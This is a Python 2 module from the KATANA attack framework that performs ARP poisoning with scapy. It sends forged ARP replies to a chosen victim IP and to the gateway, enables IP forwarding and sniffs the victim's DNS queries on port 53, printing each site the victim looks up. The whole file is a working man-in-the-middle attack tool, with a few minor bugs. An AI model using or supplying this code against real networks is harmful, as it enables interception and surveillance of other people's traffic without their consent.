# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Modules   : ARP Poisoning     #
# Script by : Unkown            #
# Date      : 26/08/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core import help           #
from core import ping           #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
from scapy.all import *         #
import threading                #
import os                       #
import sys                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaultipv="127.0.0.1"
defaultgat="192.168.1.254"
defaultint="wlan1"
vthread = []
defaultgatthread = []  
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(para,parb,parc):
    global defaultgat,defaultipv,defaultint
    defaultipv=para
    defaultgat=parb
    defaultint=parc
    arpp(1)

def arpp(run): 
    try:
        global defaultgat,defaultipv,defaultint
        if run!=1:
            actions=raw_input(d.prompt("net/arpspoof"))
        else:
            actions="run"
        if actions == "show options" or actions == "sop":
            d.option()
            d.descrip("ipvic","yes","IP victim",defaultipv)
            d.descrip("gway","yes","Gateway-Router.",defaultgat)
            d.descrip("inter","yes","Interface",defaultint)
            print ""
            arpp(0)
        elif actions[0:9] == "set ipvic":
            defaultipv = actions[10:]
            d.change("ipvic",defaultipv)
            arpp(0)
        elif actions[0:8] == "set gway":
            defaultgat = actions[9:]
            d.change("gway",defaultgat)
            arpp(0)
        elif actions[0:10] == "set inter":
            defaultint = actions[11:]
            d.change("inter",defaultint)
            arpp(0)
        elif actions=="exit" or actions=="x":
            d.goodbye()
            exit()
        elif actions=="help" or actions=="h":
            help.help()
        elif actions=="back" or actions=="b":
            return
            return
        elif actions=="run"  or actions=="r":
            d.run()
            try:
                print " "+Alr+" Ensure the victim recieves packets by forwarding them"
                os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
                while True:    
                    vpoison = threading.Thread(target=v_poison)
                    vpoison.setDaemon(True)
                    vthread.append(vpoison)
                    vpoison.start()        
                    defaultgatpoison = threading.Thread(target=defaultgat_poison)
                    defaultgatpoison.setDaemon(True)
                    defaultgatthread.append(defaultgatpoison)
                    defaultgatpoison.start()
                    pkt = sniff(defaultint=defaultint,filter='udp port 53',prn=dnshandle)
            except(KeyboardInterrupt, SystemExit):
                d.kbi()
                os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        else:
            d.nocommand()
    except:
        d.kbi()
        exit()
    arpp(0)


def dnshandle(pkt):
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: 
                        print 'Victim: ' + defaultipv + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
def v_poison():
        v = ARP(pdst=defaultipv, psrc=defaultgat)
        while True:
                try:   
                       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     
                         sys.exit(1)
def defaultgat_poison():
        defaultgat = ARP(pdst=defaultgat, psrc=defaultipv)
        while True:
                try:
                       send(defaultgat,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)
 

 
